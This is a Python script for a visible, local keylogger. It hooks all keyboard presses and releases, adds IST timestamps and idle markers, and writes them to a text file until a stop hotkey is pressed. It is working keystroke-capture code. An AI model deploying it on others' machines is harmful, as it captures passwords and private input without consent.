import keyboard
import time
from datetime import datetime, timedelta
import os

# -------------------------------
# CONFIGURABLE SETTINGS
# -------------------------------
IDLE_THRESHOLD = 60        # seconds to detect idle
STOP_HOTKEY = 'ctrl+shift+q'
LOG_DIR = "logs"

# IST offset from UTC
IST_OFFSET = timedelta(hours=5, minutes=30)

# Ensure logs folder exists
os.makedirs(LOG_DIR, exist_ok=True)

# Function to make a filename Windows-safe
def safe_filename(name):
    return "".join(c if c.isalnum() or c in ("-", "_") else "_" for c in name)

# Create safe timestamped log filename
timestamp_str = (datetime.utcnow() + IST_OFFSET).strftime("%d-%b-%Y_%H-%M-%S")
safe_timestamp = safe_filename(timestamp_str)
log_file_path = os.path.join(LOG_DIR, safe_timestamp + "_IST_keylog.txt")

# Special key mapping for readability
special_keys = {
    "space": " [SPACE] ",
    "enter": " [ENTER] ",
    "shift": " [SHIFT] ",
    "ctrl": " [CTRL] ",
    "alt": " [ALT] ",
    "tab": " [TAB] ",
    "backspace": " [BACKSPACE] ",
    "caps lock": " [CAPSLOCK] "
}

# Track last activity time
last_activity = time.time()

# -------------------------------
# FUNCTIONS
# -------------------------------
def log_event(event_type, key_name):
    """Log a key event with IST timestamp and idle detection."""
    global last_activity

    key_name = special_keys.get(key_name, key_name)
    timestamp = (datetime.utcnow() + IST_OFFSET).strftime("%d-%b-%Y %H:%M:%S")

    now = time.time()
    idle_seconds = now - last_activity
    last_activity = now

    log_line = ""
    if idle_seconds > IDLE_THRESHOLD:
        log_line += f"\n--- IDLE for {int(idle_seconds)} seconds ---\n"
    log_line += f"{timestamp} [{event_type}] : {key_name}\n"

    try:
        with open(log_file_path, 'a', encoding='utf-8') as f:
            f.write(log_line)
    except Exception as e:
        print(f"[Error writing log] {e}")

def on_press(event):
    log_event("PRESS", event.name)

def on_release(event):
    log_event("RELEASE", event.name)

# -------------------------------
# MAIN FUNCTION
# -------------------------------
def keylog():
    """Start the keylogger and wait for STOP_HOTKEY to exit."""
    print(f"[*] Plain-text Keylogger started (IST). Logs saved in: {log_file_path}")
    print(f"[*] Press {STOP_HOTKEY} to stop logging safely.")

    try:
        keyboard.on_press(on_press)
        keyboard.on_release(on_release)
        keyboard.wait(STOP_HOTKEY)
    except KeyboardInterrupt:
        print("[*] KeyboardInterrupt received. Stopping keylogger.")
    except Exception as e:
        print(f"[Error] {e}")
    finally:
        print("[*] Keylogger stopped.")

# -------------------------------
# ENTRY POINT
# -------------------------------
if __name__ == "__main__":
    keylog()
